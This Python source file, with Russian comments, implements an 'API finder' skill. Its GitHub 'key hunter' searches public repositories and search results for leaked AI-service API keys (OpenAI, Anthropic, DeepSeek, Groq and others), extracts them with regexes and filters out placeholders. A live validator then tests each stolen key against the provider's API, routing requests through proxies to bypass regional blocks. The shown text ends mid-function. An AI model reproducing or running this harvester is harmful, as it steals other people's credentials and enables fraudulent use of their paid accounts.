# api-finder/skill.py v7.0.0 — FIXED: real chat/completions endpoint + rate-limit + concurrency
# ТРИ МОДУЛЯ: Каталог Public-APIs | GitHub OSINT Key Hunter | DuckDuckGo Search
# ВАЛИДАТОРЫ: 16 контейнеров + LIVE-CHECK с поддержкой прокси
# PROXY: авто-определение необходимости прокси по региону и сервису

import json, re, os, sys, time, base64, hashlib, asyncio
from pathlib import Path
from datetime import datetime, timedelta
from collections import defaultdict
from typing import Optional, Dict, List, Tuple, Any
from dataclasses import dataclass, field

sys.path.insert(0, str(Path(__file__).parent.parent.parent.parent))
from utils import run_async

try: import httpx; HAS_HTTPX = True
except ImportError: HAS_HTTPX = False

try: from duckduckgo_search import DDGS; HAS_DDGS = True
except ImportError: HAS_DDGS = False

try: from bs4 import BeautifulSoup; HAS_BS4 = True
except ImportError: HAS_BS4 = False

# ── Пути ─────────────────────────────────────────────────────────────────
_DATA = Path(__file__).parent / "data.json"
_ENV = Path(__file__).parent.parent / ".env"
_HUNT_CACHE = Path(__file__).parent / "hunt_results.json"

_README_URL = "https://raw.githubusercontent.com/public-apis/public-apis/master/README.md"
_CACHE_TTL_HOURS = 24

# ═══════════════════════════════════════════════════════════════════════════
# ███  PROXY CONFIGURATION  ████████████████████████████████████████████████
# ═══════════════════════════════════════════════════════════════════════════

@dataclass
class ProxyConfig:
    """Конфигурация прокси для сервиса."""
    http: Optional[str] = None       # http://host:port
    https: Optional[str] = None      # https://host:port
    socks5: Optional[str] = None     # socks5://host:port
    enabled: bool = True
    note: str = ""

# ═══════════════════════════════════════════════════════════════════════════
# ███  SERVICE NETWORK PROFILES  ███████████████████████████████████████████
# ═══════════════════════════════════════════════════════════════════════════

@dataclass
class ServiceNetProfile:
    """Сетевой профиль сервиса: нужен ли прокси, какие ендпоинты."""
    service: str
    endpoints: List[str]                    # все ендпоинты
    region_blocked: bool = False            # заблокирован в РФ
    needs_proxy: bool = False               # требует прокси
    proxy_recommended: bool = False         # рекомендуется прокси
    works_direct: bool = True               # работает напрямую
    notes: str = ""

# СЕТЕВЫЕ ПРОФИЛИ СЕРВИСОВ (актуально для РФ)
SERVICE_NET_PROFILES: Dict[str, ServiceNetProfile] = {
    'DeepSeek': ServiceNetProfile(
        service='DeepSeek',
        endpoints=['api.deepseek.com', 'platform.deepseek.com'],
        region_blocked=False,
        needs_proxy=False,
        proxy_recommended=False,
        works_direct=True,
        notes='Работает напрямую из РФ без прокси',
    ),
    'OpenAI': ServiceNetProfile(
        service='OpenAI',
        endpoints=['api.openai.com'],
        region_blocked=False,
        needs_proxy=False,
        proxy_recommended=True,
        works_direct=False,
        notes='ТРЕБУЕТ ПРОКСИ из РФ (региональная блокировка). Рекомендуется VPN/прокси.',
    ),
    'Anthropic': ServiceNetProfile(
        service='Anthropic',
        endpoints=['api.anthropic.com'],
        region_blocked=False,
        needs_proxy=False,
        proxy_recommended=True,
        works_direct=False,
        notes='ТРЕБУЕТ ПРОКСИ из РФ. API недоступен напрямую.',
    ),
    'Google Gemini': ServiceNetProfile(
        service='Google Gemini',
        endpoints=['generativelanguage.googleapis.com'],
        region_blocked=False,
        needs_proxy=False,
        proxy_recommended=False,
        works_direct=True,
        notes='Работает напрямую, но нестабильно. Иногда нужен прокси.',
    ),
    'Groq': ServiceNetProfile(
        service='Groq',
        endpoints=['api.groq.com'],
        region_blocked=False,
        needs_proxy=False,
        proxy_recommended=True,
        works_direct=False,
        notes='ТРЕБУЕТ ПРОКСИ из РФ.',
    ),
    'Hugging Face': ServiceNetProfile(
        service='Hugging Face',
        endpoints=['huggingface.co'],
        region_blocked=False,
        needs_proxy=False,
        proxy_recommended=False,
        works_direct=True,
        notes='Работает напрямую.',
    ),
    'Replicate': ServiceNetProfile(
        service='Replicate',
        endpoints=['api.replicate.com'],
        region_blocked=False,
        needs_proxy=False,
        proxy_recommended=True,
        works_direct=False,
        notes='ТРЕБУЕТ ПРОКСИ из РФ.',
    ),
    'Perplexity': ServiceNetProfile(
        service='Perplexity',
        endpoints=['api.perplexity.ai'],
        region_blocked=False,
        needs_proxy=False,
        proxy_recommended=False,
        works_direct=False,
        notes='ТРЕБУЕТ ПРОКСИ из РФ. Региональная блокировка.',
    ),
    'ElevenLabs': ServiceNetProfile(
        service='ElevenLabs',
        endpoints=['api.elevenlabs.io'],
        region_blocked=False,
        needs_proxy=False,
        proxy_recommended=False,
        works_direct=True,
        notes='Работает напрямую из РФ.',
    ),
    'Mistral': ServiceNetProfile(
        service='Mistral',
        endpoints=['api.mistral.ai'],
        region_blocked=False,
        needs_proxy=False,
        proxy_recommended=False,
        works_direct=True,
        notes='Работает напрямую.',
    ),
    'Cohere': ServiceNetProfile(
        service='Cohere',
        endpoints=['api.cohere.ai'],
        region_blocked=False,
        needs_proxy=False,
        proxy_recommended=False,
        works_direct=False,
        notes='ТРЕБУЕТ ПРОКСИ из РФ.',
    ),
    'Together AI': ServiceNetProfile(
        service='Together AI',
        endpoints=['api.together.xyz'],
        region_blocked=False,
        needs_proxy=False,
        proxy_recommended=True,
        works_direct=True,
        notes='Может работать напрямую, но нестабильно.',
    ),
    'Stability AI': ServiceNetProfile(
        service='Stability AI',
        endpoints=['api.stability.ai'],
        region_blocked=False,
        needs_proxy=False,
        proxy_recommended=True,
        works_direct=False,
        notes='ТРЕБУЕТ ПРОКСИ из РФ.',
    ),
    'Fireworks AI': ServiceNetProfile(
        service='Fireworks AI',
        endpoints=['api.fireworks.ai'],
        region_blocked=False,
        needs_proxy=False,
        proxy_recommended=False,
        works_direct=True,
        notes='Работает напрямую.',
    ),
    'Lepton AI': ServiceNetProfile(
        service='Lepton AI',
        endpoints=['api.lepton.ai'],
        region_blocked=False,
        needs_proxy=False,
        proxy_recommended=False,
        works_direct=True,
        notes='Работает напрямую.',
    ),
}

# ═══════════════════════════════════════════════════════════════════════════
# ███  ЗАГРУЗКА PROXY ИЗ .env  █████████████████████████████████████████████
# ═══════════════════════════════════════════════════════════════════════════

def _load_proxy_from_env() -> ProxyConfig:
    """Загружает настройки прокси из .env файла."""
    proxy = ProxyConfig()
    try:
        if _ENV.exists():
            env_text = _ENV.read_text(encoding='utf-8')
            for line in env_text.split('\n'):
                line = line.strip()
                if line.startswith('#') or '=' not in line:
                    continue
                k, _, v = line.partition('=')
                k, v = k.strip(), v.strip().strip('"').strip("'")
                
                if k == 'PROXY_HTTP':
                    proxy.http = v
                elif k == 'PROXY_HTTPS':
                    proxy.https = v
                elif k == 'PROXY_SOCKS5':
                    proxy.socks5 = v
                elif k == 'PROXY_ENABLED':
                    proxy.enabled = v.lower() in ('1', 'true', 'yes', 'on')
    except Exception:
        pass
    return proxy

def _save_proxy_to_env(proxy: ProxyConfig) -> bool:
    """Сохраняет настройки прокси в .env."""
    try:
        lines = []
        if _ENV.exists():
            existing = _ENV.read_text(encoding='utf-8').split('\n')
            skip_keys = {'PROXY_HTTP', 'PROXY_HTTPS', 'PROXY_SOCKS5', 'PROXY_ENABLED'}
            lines = [l for l in existing if l.strip().split('=')[0].strip() not in skip_keys]
        
        lines.append(f'PROXY_HTTP={proxy.http or ""}')
        lines.append(f'PROXY_HTTPS={proxy.https or ""}')
        lines.append(f'PROXY_SOCKS5={proxy.socks5 or ""}')
        lines.append(f'PROXY_ENABLED={"1" if proxy.enabled else "0"}')
        
        _ENV.write_text('\n'.join(lines) + '\n', encoding='utf-8')
        return True
    except Exception:
        return False

# ═══════════════════════════════════════════════════════════════════════════
# ███  API ПАТТЕРНЫ (форматы ключей)  ██████████████████████████████████████
# ═══════════════════════════════════════════════════════════════════════════

API_PATTERNS = {
    'deepseek': {
        'prefixes': ['sk-'],
        'lengths': [35],  # sk- + 32 hex
        'pattern': r'sk-[a-f0-9]{32}',
        'service': 'DeepSeek',
        'live_endpoint': 'https://api.deepseek.com/v1/chat/completions',
        'live_method': 'POST',
        'live_body': lambda key: {"model": "deepseek-chat", "messages": [{"role": "user", "content": "ping"}], "max_tokens": 1},
        'live_headers': lambda key: {"Content-Type": "application/json", "Authorization": f"Bearer {key}"},
        'code_map': {200: 'WORKING', 402: 'NO_BALANCE', 401: 'INVALID', 403: 'INVALID'},
    },
    'openai_legacy': {
        'prefixes': ['sk-'],
        'lengths': [51, 52, 55],
        'pattern': r'sk-[A-Za-z0-9]{48,55}',
        'service': 'OpenAI (legacy)',
        'live_endpoint': 'https://api.openai.com/v1/models',
        'live_method': 'GET',
        'live_body': lambda key: None,
        'live_headers': lambda key: {"Authorization": f"Bearer {key}"},
        'code_map': {200: 'WORKING', 429: 'NO_BALANCE', 401: 'INVALID', 403: 'INVALID'},
    },
    'openai_project': {
        'prefixes': ['sk-proj-'],
        'lengths': [56, 80, 100, 120],
        'pattern': r'sk-proj-[A-Za-z0-9]{50,120}',
        'service': 'OpenAI (project)',
        'live_endpoint': 'https://api.openai.com/v1/models',
        'live_method': 'GET',
        'live_body': lambda key: None,
        'live_headers': lambda key: {"Authorization": f"Bearer {key}"},
        'code_map': {200: 'WORKING', 429: 'NO_BALANCE', 401: 'INVALID', 403: 'INVALID'},
    },
    'anthropic': {
        'prefixes': ['sk-ant-api03-', 'sk-ant-api04-', 'sk-ant-'],
        'lengths': [60, 80, 83, 92, 100, 103, 108],
        'pattern': r'sk-ant-(?:api0[34]-)?[A-Za-z0-9_-]{60,110}',
        'service': 'Anthropic Claude',
        'live_endpoint': 'https://api.anthropic.com/v1/models',
        'live_method': 'GET',
        'live_body': lambda key: None,
        'live_headers': lambda key: {"x-api-key": key, "anthropic-version": "2023-06-01"},
        'code_map': {200: 'WORKING', 429: 'NO_BALANCE', 401: 'INVALID', 403: 'INVALID'},
    },
    'google_ai': {
        'prefixes': ['AIza', 'ya29'],
        'lengths': [39, 40],
        'pattern': r'(?:AIza|ya29)[A-Za-z0-9_-]{35,39}',
        'service': 'Google AI (Gemini)',
        'live_endpoint': 'https://generativelanguage.googleapis.com/v1/models?key={key}',
        'live_method': 'GET',
        'live_body': lambda key: None,
        'live_headers': lambda key: {},
        'code_map': {200: 'WORKING', 429: 'NO_BALANCE', 403: 'INVALID', 400: 'INVALID'},
    },
    'huggingface': {
        'prefixes': ['hf_'],
        'lengths': [37, 40, 50],
        'pattern': r'hf_[A-Za-z0-9]{30,50}',
        'service': 'Hugging Face',
        'live_endpoint': 'https://huggingface.co/api/whoami',
        'live_method': 'GET',
        'live_body': lambda key: None,
        'live_headers': lambda key: {"Authorization": f"Bearer {key}"},
        'code_map': {200: 'WORKING', 401: 'INVALID', 403: 'INVALID'},
    },
    'replicate': {
        'prefixes': ['r8_'],
        'lengths': [40, 50],
        'pattern': r'r8_[A-Za-z0-9]{35,50}',
        'service': 'Replicate',
        'live_endpoint': 'https://api.replicate.com/v1/models',
        'live_method': 'GET',
        'live_body': lambda key: None,
        'live_headers': lambda key: {"Authorization": f"Token {key}"},
        'code_map': {200: 'WORKING', 401: 'INVALID'},
    },
    'perplexity': {
        'prefixes': ['pplx-'],
        'lengths': [48, 53, 60],
        'pattern': r'pplx-[A-Za-z0-9]{45,60}',
        'service': 'Perplexity AI',
        'live_endpoint': 'https://api.perplexity.ai/models',
        'live_method': 'GET',
        'live_body': lambda key: None,
        'live_headers': lambda key: {"Authorization": f"Bearer {key}"},
        'code_map': {200: 'WORKING', 429: 'NO_BALANCE', 401: 'INVALID', 403: 'INVALID'},
    },
    'groq': {
        'prefixes': ['gsk_'],
        'lengths': [54, 56, 60],
        'pattern': r'gsk_[A-Za-z0-9]{50,60}',
        'service': 'Groq',
        'live_endpoint': 'https://api.groq.com/openai/v1/models',
        'live_method': 'GET',
        'live_body': lambda key: None,
        'live_headers': lambda key: {"Authorization": f"Bearer {key}"},
        'code_map': {200: 'WORKING', 429: 'NO_BALANCE', 401: 'INVALID', 403: 'INVALID'},
    },
    'elevenlabs': {
        'prefixes': ['sk_'],
        'lengths': [55, 60],
        'pattern': r'sk_[A-Za-z0-9]{50,60}',
        'service': 'ElevenLabs',
        'live_endpoint': 'https://api.elevenlabs.io/v1/user',
        'live_method': 'GET',
        'live_body': lambda key: None,
        'live_headers': lambda key: {"xi-api-key": key},
        'code_map': {200: 'WORKING', 401: 'INVALID'},
    },
    'cohere': {
        'prefixes': ['cohere-'],
        'lengths': [40, 50],
        'pattern': r'cohere-[A-Za-z0-9]{35,50}',
        'service': 'Cohere',
        'live_endpoint': 'https://api.cohere.ai/v1/models',
        'live_method': 'GET',
        'live_body': lambda key: None,
        'live_headers': lambda key: {"Authorization": f"Bearer {key}"},
        'code_map': {200: 'WORKING', 429: 'NO_BALANCE', 401: 'INVALID', 403: 'INVALID'},
    },
    'mistral': {
        'prefixes': ['mistral-'],
        'lengths': [40, 48],
        'pattern': r'mistral-[A-Za-z0-9]{35,48}',
        'service': 'Mistral AI',
        'live_endpoint': 'https://api.mistral.ai/v1/models',
        'live_method': 'GET',
        'live_body': lambda key: None,
        'live_headers': lambda key: {"Authorization": f"Bearer {key}"},
        'code_map': {200: 'WORKING', 429: 'NO_BALANCE', 401: 'INVALID', 403: 'INVALID'},
    },
    'together': {
        'prefixes': ['together_'],
        'lengths': [40, 50],
        'pattern': r'together_[A-Za-z0-9]{35,50}',
        'service': 'Together AI',
        'live_endpoint': 'https://api.together.xyz/v1/models',
        'live_method': 'GET',
        'live_body': lambda key: None,
        'live_headers': lambda key: {"Authorization": f"Bearer {key}"},
        'code_map': {200: 'WORKING', 429: 'NO_BALANCE', 401: 'INVALID', 403: 'INVALID'},
    },
    'stability': {
        'prefixes': ['sk-'],
        'lengths': [52, 55],
        'pattern': r'sk-[A-Za-z0-9]{48,55}',
        'service': 'Stability AI',
        'live_endpoint': 'https://api.stability.ai/v1/user/account',
        'live_method': 'GET',
        'live_body': lambda key: None,
        'live_headers': lambda key: {"Authorization": f"Bearer {key}"},
        'code_map': {200: 'WORKING', 401: 'INVALID', 403: 'INVALID'},
    },
    'fireworks': {
        'prefixes': ['fw_'],
        'lengths': [40, 50],
        'pattern': r'fw_[A-Za-z0-9]{35,50}',
        'service': 'Fireworks AI',
        'live_endpoint': 'https://api.fireworks.ai/inference/v1/models',
        'live_method': 'GET',
        'live_body': lambda key: None,
        'live_headers': lambda key: {"Authorization": f"Bearer {key}"},
        'code_map': {200: 'WORKING', 401: 'INVALID', 403: 'INVALID'},
    },
    'lepton': {
        'prefixes': ['lep_'],
        'lengths': [40, 50],
        'pattern': r'lep_[A-Za-z0-9]{35,50}',
        'service': 'Lepton AI',
        'live_endpoint': 'https://api.lepton.ai/v1/models',
        'live_method': 'GET',
        'live_body': lambda key: None,
        'live_headers': lambda key: {"Authorization": f"Bearer {key}"},
        'code_map': {200: 'WORKING', 401: 'INVALID'},
    },
}

# ═══════════════════════════════════════════════════════════════════════════
# ███  ВАЛИДАТОР БАЗОВЫЙ (формат ключа)  ███████████████████████████████████
# ═══════════════════════════════════════════════════════════════════════════

def _is_fake_or_placeholder(key: str) -> bool:
    """Фильтрует плейсхолдеры и фейковые ключи."""
    fake_keywords = ['example', 'your_key', 'api_key', 'xxx', 'test', 'demo',
                     'placeholder', 'changeme', 'here', 'your-', 'replace',
                     'get_your_own', 'xxxxxxxx', 'X-X-X', 'YOUR-',
                     '1234abcd1234', 'abcdef1234', '5678efgh', 
                     '0123456789abcdef', 'AbCdEfGhIjKl', 'DoubleQuotedSecret',
                     'deadbeef', 'xkeysib', 'YOUR_BREVO', 'ngrok-token']
    key_lower = key.lower()
    for kw in fake_keywords:
        if kw.lower() in key_lower:
            return True
    
    # Проверка на паттерны-последовательности
    if re.match(r'^sk-[0-9a-f]{4}abcd[0-9a-f]{4}abcd', key):
        return True
    if re.match(r'^sk-[a-z]{4}[0-9]{4}[a-z]{4}[0-9]{4}', key):
        return True
    if re.match(r'^sk-X+', key):
        return True
    
    # Очень низкая энтропия
    body = key[3:] if key.startswith('sk-') else key
    if len(set(body)) < 6 and len(body) > 20:
        return True
    
    return False

def _validate_deepseek_format(key: str) -> Dict:
    """Валидация формата ключа DeepSeek (без live-запроса)."""
    if not key.startswith('sk-'):
        return {'valid': False, 'reason': 'no_sk_prefix'}
    
    body = key[3:]
    if len(body) != 32:
        return {'valid': False, 'reason': f'wrong_length:{len(body)}'}
    
    if not all(c in '0123456789abcdef' for c in body.lower()):
        return {'valid': False, 'reason': 'not_hex'}
    
    if _is_fake_or_placeholder(key):
        return {'valid': False, 'reason': 'fake_or_placeholder'}
    
    return {'valid': True, 'reason': 'format_ok'}

def _validate_key_format(key: str, service_type: str) -> Dict:
    """Базовая валидация формата ключа для любого сервиса."""
    if service_type not in API_PATTERNS:
        return {'valid': False, 'reason': 'unknown_service'}
    
    cfg = API_PATTERNS[service_type]
    
    # Проверка префикса
    prefix_ok = any(key.startswith(p) for p in cfg['prefixes'])
    if not prefix_ok:
        return {'valid': False, 'reason': 'bad_prefix'}
    
    # Проверка длины
    if len(key) not in cfg['lengths']:
        return {'valid': False, 'reason': f'bad_length:{len(key)}'}
    
    # Проверка на плейсхолдер
    if _is_fake_or_placeholder(key):
        return {'valid': False, 'reason': 'fake_or_placeholder'}
    
    return {'valid': True, 'reason': 'format_ok'}

# ═══════════════════════════════════════════════════════════════════════════
# ███  LIVE-ВАЛИДАТОРЫ (HTTP запросы)  █████████████████████████████████████
# ═══════════════════════════════════════════════════════════════════════════

async def _live_validate_one(key: str, service_type: str, proxy: Optional[ProxyConfig] = None, 
                              timeout: int = 15) -> Dict:
    """
    Живая проверка одного ключа через HTTP-запрос.
    Возвращает: {key, status: WORKING|NO_BALANCE|INVALID|TIMEOUT|ERROR, code, details}
    """
    if not HAS_HTTPX:
        return {'key': key, 'service': service_type, 'status': 'ERROR', 
                'code': 0, 'details': 'httpx not installed', 'timestamp': datetime.now().isoformat()}
    
    if service_type not in API_PATTERNS:
        return {'key': key, 'service': service_type, 'status': 'ERROR',
                'code': 0, 'details': f'unknown service: {service_type}', 'timestamp': datetime.now().isoformat()}
    
    cfg = API_PATTERNS[service_type]
    endpoint = cfg['live_endpoint']
    method = cfg['live_method']
    
    # Подстановка ключа в URL (для Google Gemini)
    if '{key}' in endpoint:
        endpoint = endpoint.replace('{key}', key)
    
    headers = cfg['live_headers'](key)
    body = cfg['live_body'](key)
    code_map = cfg['code_map']
    
    # Настройка прокси
    proxy_url = None
    if proxy and proxy.enabled:
        proxy_url = proxy.https or proxy.http or proxy.socks5
    
    try:
        async with httpx.AsyncClient(proxy=proxy_url, timeout=timeout) as client:
            if method == 'POST':
                resp = await client.post(endpoint, headers=headers, json=body)
            else:
                resp = await client.get(endpoint, headers=headers)
            
            status_code = resp.status_code
            mapped = code_map.get(status_code, 'UNKNOWN')
            
            result = {
                'key': key,
                'service': service_type,
                'status': mapped,
                'code': status_code,
                'details': '',
                'timestamp': datetime.now().isoformat()
            }
            
            # Попытка извлечь детали из тела ответа
            try:
                resp_json = resp.json()
                if 'error' in resp_json:
                    result['details'] = str(resp_json['error'])[:200]
                elif 'message' in resp_json:
                    result['details'] = str(resp_json['message'])[:200]
            except Exception:
                result['details'] = resp.text[:200]
            
            return result
            
    except httpx.TimeoutException:
        return {'key': key, 'service': service_type, 'status': 'TIMEOUT',
                'code': 0, 'details': f'Timeout after {timeout}s', 'timestamp': datetime.now().isoformat()}
    except Exception as e:
        return {'key': key, 'service': service_type, 'status': 'ERROR',
                'code': 0, 'details': str(e)[:200], 'timestamp': datetime.now().isoformat()}

async def _live_validate_batch(keys: List[str], service_type: str, 
                                proxy: Optional[ProxyConfig] = None,
                                concurrency: int = 5, 
                                delay: float = 0.35,
                                timeout: int = 15) -> List[Dict]:
    """
    Пакетная live-проверка ключей с ограничением конкурентности.
    concurrency=5: макс 5 одновременных запросов
    delay=0.35: ~3 запроса/сек на поток
    """
    if not keys:
        return []
    
    sem = asyncio.Semaphore(concurrency)
    results = []
    
    async def check_one(key):
        async with sem:
            result = await _live_validate_one(key, service_type, proxy, timeout)
            results.append(result)
            await asyncio.sleep(delay)  # rate limiting
            return result
    
    tasks = [check_one(k) for k in keys]
    await asyncio.gather(*tasks, return_exceptions=True)
    
    return results

# ═══════════════════════════════════════════════════════════════════════════
# ███  МАССОВАЯ ВАЛИДАЦИЯ HUNT RESULTS  ████████████████████████████████████
# ═══════════════════════════════════════════════════════════════════════════

def _load_hunt_results() -> Dict:
    """Загружает кеш охоты."""
    if _HUNT_CACHE.exists():
        try:
            return json.loads(_HUNT_CACHE.read_text(encoding='utf-8'))
        except Exception:
            pass
    return {}

def _save_hunt_results(data: Dict):
    """Сохраняет кеш охоты."""
    _HUNT_CACHE.write_text(json.dumps(data, ensure_ascii=False, indent=2), encoding='utf-8')

# ═══════════════════════════════════════════════════════════════════════════
# ███  РАБОТА С .env  ██████████████████████████████████████████████████████
# ═══════════════════════════════════════════════════════════════════════════

def _read_env() -> str:
    """Читает .env файл."""
    if _ENV.exists():
        return _ENV.read_text(encoding='utf-8')
    return ""

def _write_env(content: str):
    """Записывает в .env."""
    _ENV.write_text(content, encoding='utf-8')

def _get_env_var(key: str) -> Optional[str]:
    """Получить значение из .env."""
    if not _ENV.exists():
        return None
    for line in _ENV.read_text(encoding='utf-8').split('\n'):
        line = line.strip()
        if line.startswith('#') or '=' not in line:
            continue
        k, _, v = line.partition('=')
        if k.strip() == key:
            return v.strip().strip('"').strip("'")
    return None

def _set_env_var(key: str, value: str) -> bool:
    """Установить/обновить переменную в .env."""
    try:
        lines = []
        found = False
        if _ENV.exists():
            for line in _ENV.read_text(encoding='utf-8').split('\n'):
                line_stripped = line.strip()
                if line_stripped.startswith('#') or '=' not in line_stripped:
                    lines.append(line)
                elif line_stripped.split('=')[0].strip() == key:
                    lines.append(f'{key}={value}')
                    found = True
                else:
                    lines.append(line)
        
        if not found:
            lines.append(f'{key}={value}')
        
        _ENV.write_text('\n'.join(lines) + '\n', encoding='utf-8')
        return True
    except Exception:
        return False

# ═══════════════════════════════════════════════════════════════════════════
# ███  ПУБЛИЧНЫЙ КАТАЛОГ API  ██████████████████████████████████████████████
# ═══════════════════════════════════════════════════════════════════════════

def _fetch_catalog() -> Optional[List[Dict]]:
    """Загружает каталог public-apis."""
    try:
        if HAS_HTTPX:
            resp = httpx.get(_README_URL, timeout=30)
            if resp.status_code != 200:
                return None
            text = resp.text
        else:
            import requests
            resp = requests.get(_README_URL, timeout=30)
            text = resp.text
        
        # Парсим markdown таблицы
        apis = []
        in_table = False
        for line in text.split('\n'):
            if line.startswith('| API'):
                in_table = True
                continue
            if in_table:
                if line.startswith('|---'):
                    continue
                if not line.startswith('|'):
                    break
                parts = [p.strip() for p in line.split('|')[1:-1]]
                if len(parts) >= 5:
                    apis.append({
                        'name': parts[0],
                        'url': parts[1],
                        'category': parts[2],
                        'auth': parts[3] if len(parts) > 3 else '',
                        'https': parts[4] if len(parts) > 4 else '',
                    })
        
        return apis
    except Exception:
        return None

def _get_catalog() -> List[Dict]:
    """Получает каталог (из кеша или загружает)."""
    # Кеш
    if _DATA.exists():
        try:
            data = json.loads(_DATA.read_text(encoding='utf-8'))
            ts = datetime.fromisoformat(data.get('updated', '2000-01-01'))
            if datetime.now() - ts < timedelta(hours=_CACHE_TTL_HOURS):
                return data.get('apis', [])
        except Exception:
            pass
    
    # Загрузка
    apis = _fetch_catalog()
    if apis:
        _DATA.write_text(json.dumps({
            'updated': datetime.now().isoformat(),
            'total': len(apis),
            'apis': apis
        }, ensure_ascii=False, indent=2), encoding='utf-8')
    
    return apis or []

def _filter_catalog(apis: List[Dict], category: str = None, query: str = None) -> List[Dict]:
    """Фильтрует каталог."""
    result = apis
    if category:
        result = [a for a in result if category.lower() in a.get('category', '').lower()]
    if query:
        q = query.lower()
        result = [a for a in result if q in a.get('name', '').lower() or q in a.get('url', '').lower()]
    return result

# ═══════════════════════════════════════════════════════════════════════════
# ███  DUCKDUCKGO SEARCH  ██████████████████████████████████████████████████
# ═══════════════════════════════════════════════════════════════════════════

def _search_ddg(query: str, max_results: int = 10) -> List[Dict]:
    """Поиск через DuckDuckGo."""
    results = []
    
    # Способ 1: библиотека duckduckgo_search
    if HAS_DDGS:
        try:
            with DDGS() as ddgs:
                for r in ddgs.text(query, max_results=max_results):
                    results.append({'title': r.get('title', ''), 'link': r.get('href', ''), 'snippet': r.get('body', '')})
            if results:
                return results
        except Exception:
            pass
    
    # Способ 2: HTML-парсинг (fallback)
    if HAS_BS4:
        try:
            import requests as req
            headers = {"User-Agent": "Mozilla/5.0"}
            params = {"q": query, "kl": "us-en"}
            url = "https://html.duckduckgo.com/html/"
            resp = req.post(url, data=params, headers=headers, timeout=15)
            if resp.status_code == 200:
                soup = BeautifulSoup(resp.text, "html.parser")
                for r in soup.find_all("a", class_="result__a", limit=max_results):
                    results.append({'title': r.get_text(), 'link': r.get('href', ''), 'snippet': ''})
        except Exception:
            pass
    
    return results

def _search_ddg_for_keys(query: str, max_results: int = 10) -> List[str]:
    """
    Ищет API ключи через DDG (Google Dorks style).
    Формирует запросы вида site:github.com "sk-" extension:env
    и извлекает потенциальные ключи.
    """
    found_keys = []
    
    # Паттерны для извлечения ключей из текста
    key_patterns = [
        re.compile(r'sk-[a-f0-9]{32}', re.IGNORECASE),           # DeepSeek
        re.compile(r'sk-[A-Za-z0-9]{48,55}', re.IGNORECASE),     # OpenAI legacy
        re.compile(r'sk-proj-[A-Za-z0-9]{50,120}', re.IGNORECASE),
        re.compile(r'sk-ant-api03-[A-Za-z0-9_-]{60,110}', re.IGNORECASE),
        re.compile(r'hf_[A-Za-z0-9]{30,50}', re.IGNORECASE),
        re.compile(r'AIza[A-Za-z0-9_-]{30,40}', re.IGNORECASE),
        re.compile(r'r8_[A-Za-z0-9]{35,50}', re.IGNORECASE),
        re.compile(r'pplx-[A-Za-z0-9]{45,60}', re.IGNORECASE),
        re.compile(r'gsk_[A-Za-z0-9]{50,60}', re.IGNORECASE),
        re.compile(r'sk_[A-Za-z0-9]{50,60}', re.IGNORECASE),
        re.compile(r'mistral-[A-Za-z0-9]{35,48}', re.IGNORECASE),
        re.compile(r'together_[A-Za-z0-9]{35,50}', re.IGNORECASE),
        re.compile(r'fw_[A-Za-z0-9]{35,50}', re.IGNORECASE),
        re.compile(r'lep_[A-Za-z0-9]{35,50}', re.IGNORECASE),
    ]
    
    search_results = _search_ddg(query, max_results)
    
    for r in search_results:
        # Ищем в заголовке и сниппете
        text = (r.get('title', '') + ' ' + r.get('snippet', '') + ' ' + r.get('link', ''))
        for pat in key_patterns:
            matches = pat.findall(text)
            for m in matches:
                if not _is_fake_or_placeholder(m):
                    found_keys.append(m)
    
    return list(set(found_keys))  # уникальные

# ═══════════════════════════════════════════════════════════════════════════
# ███  GITHUB OSINT KEY HUNTER  ████████████████████████████████████████████
# ═══════════════════════════════════════════════════════════════════════════

GITHUB_SEARCH_QUERIES = [
    # DeepSeek
    'DEEPSEEK_API_KEY language:env',
    'sk- extension:env deepseek',
    # OpenAI
    'OPENAI_API_KEY language:env',
    'sk-proj- extension:env',
    'sk-svcacct- extension:env',
    # Anthropic
    'ANTHROPIC_API_KEY language:env',
    'sk-ant-api03- extension:env',
    # Google
    'GOOGLE_API_KEY language:env',
    'GEMINI_API_KEY language:env',
    # Hugging Face
    'HUGGINGFACE_API_KEY language:env',
    'hf_ extension:env',
    # General
    'API_KEY language:env',
    '"sk-" extension:md',
    '"sk-" extension:txt',
]

def _github_search_code(query: str, page: int = 1, token: Optional[str] = None) -> Optional[Dict]:
    """Поиск по GitHub Code Search API."""
    if not HAS_HTTPX:
        return None
    
    try:
        headers = {"Accept": "application/vnd.github.v3+json"}
        if token:
            headers["Authorization"] = f"token {token}"
        
        params = {"q": query, "per_page": 30, "page": page}
        resp = httpx.get("https://api.github.com/search/code", headers=headers, params=params, timeout=20)
        
        if resp.status_code == 200:
            return resp.json()
        elif resp.status_code == 403:
            return {'error': 'rate_limit', 'items': []}
        else:
            return None
    except Exception:
        return None

def _github_get_file(url: str, token: Optional[str] = None) -> Optional[str]:
    """Получает содержимое файла с GitHub."""
    if not HAS_HTTPX:
        return None
    
    try:
        headers = {}
        if token:
            headers["Authorization"] = f"token {token}"
        resp = httpx.get(url, headers=headers, timeout=15)
        if resp.status_code == 200:
            return resp.text
        return None
    except Exception:
        return None

def _extract_keys_from_text(text: str) -> Dict[str, str]:
    """Извлекает API ключи из текста."""
    found = {}
    for service_type, cfg in API_PATTERNS.items():
        pat = re.compile(cfg['pattern'])
        matches = pat.findall(text)
        for m in matches:
            if m not in found and not _is_fake_or_placeholder(m):
                found[m] = service_type
    return found

def _hunt_keys_github(token: Optional[str] = None, max_pages: int = 1) -> Dict:
    """
    Охота на ключи через GitHub Code Search API.
    Возвращает: {keys: {key: {service, source, validated}}}
    """
    if not HAS_HTTPX:
        return {'error': 'httpx_not_installed', 'keys': {}}
    
    all_keys = {}
    processed = set()
    
    for query in GITHUB_SEARCH_QUERIES:
        for page in range(1, max_pages + 1):
            result = _github_search_code(query, page, token)
            if not result or 'items' not in result:
                break
            
            for item in result['items']:
                file_id = f"{item['repository']['full_name']}:{item['path']}"
                if file_id in processed:
                    continue
                processed.add(file_id)
                
                # Проверяем расширение
                path = item['path'].lower()
                valid_ext = any(path.endswith(ext) for ext in [
                    '.env', '.yaml', '.yml', '.json', '.toml', '.ini', '.cfg',
                    '.py', '.js', '.ts', '.md', '.txt', '.sh', '.xml', '.config'
                ])
                if not valid_ext:
                    continue
                
                # Получаем содержимое
                raw_url = item.get('html_url', '').replace('github.com', 'raw.githubusercontent.com').replace('/blob/', '/')
                content = _github_get_file(raw_url, token)
                if content:
                    keys = _extract_keys_from_text(content)
                    for k, svc in keys.items():
                        if k not in all_keys:
                            all_keys[k] = {
                                'service': svc,
                                'source': file_id,
                                'validated': False,
                                'live_status': None,
                            }
            
            time.sleep(1)  # Rate limit
    
